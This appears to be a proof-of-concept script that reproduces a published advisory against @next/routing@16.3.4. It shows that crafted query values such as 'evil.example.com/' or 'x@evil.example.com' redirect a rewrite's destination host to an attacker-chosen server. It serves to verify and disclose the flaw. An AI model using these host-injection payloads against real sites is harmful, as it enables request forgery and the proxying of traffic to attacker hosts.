// Faithful reproduction of the GHSA-p9j2-gv94-2wf4 shape against the PUBLISHED
// @next/routing@16.3.4 dist: destination hostname built from a `has` capture
// (query param), where raw / # ? @ survive because they are not path segments.
const { resolveRoutes } = require('./package/dist/index.js')

const routes = () => ({
  caseSensitive: false,
  beforeMiddleware: [],
  middlewareMatchers: [],
  beforeFiles: [],
  afterFiles: [{
    sourceRegex: '^/$',
    has: [{ type: 'query', key: 'region', value: '(?<region>.+)' }],
    destination: 'https://$region.api.example.com/data',
  }],
  dynamicRoutes: [],
  onMatch: [],
  fallback: [],
  shouldNormalizeNextData: false,
})

async function run(region) {
  const url = new URL('https://victim.test/')
  url.searchParams.set('region', region)
  const res = await resolveRoutes({
    url,
    buildId: 'test',
    basePath: '',
    requestBody: new ReadableStream({ start(c) { c.close() } }),
    headers: new Headers(),
    pathnames: [],
    routes: routes(),
    invokeMiddleware: async () => ({}),
  })
  return res
}

;(async () => {
  console.log('@next/routing@16.3.4 (published dist)')
  console.log('destination: https://$region.api.example.com/data')
  console.log('capture: has query param `region` = (?<region>.+)\n')
  for (const r of [
    'us-east',
    'evil.example.com/',
    'evil.example.com#',
    'evil.example.com?',
    'evil.example.com\\',
    'x@evil.example.com',
  ]) {
    try {
      const res = await run(r)
      const ext = res?.externalRewrite
      let host = ''
      if (ext) { try { host = new URL(ext).host } catch {} }
      console.log(`  region=${JSON.stringify(r).padEnd(24)} externalRewrite=${ext ?? '(none)'}`)
      if (host) console.log(`  ${''.padEnd(23)} RESOLVED HOST -> ${host}`)
    } catch (e) {
      console.log(`  region=${JSON.stringify(r).padEnd(24)} threw: ${e.message.slice(0, 80)}`)
    }
  }
})()
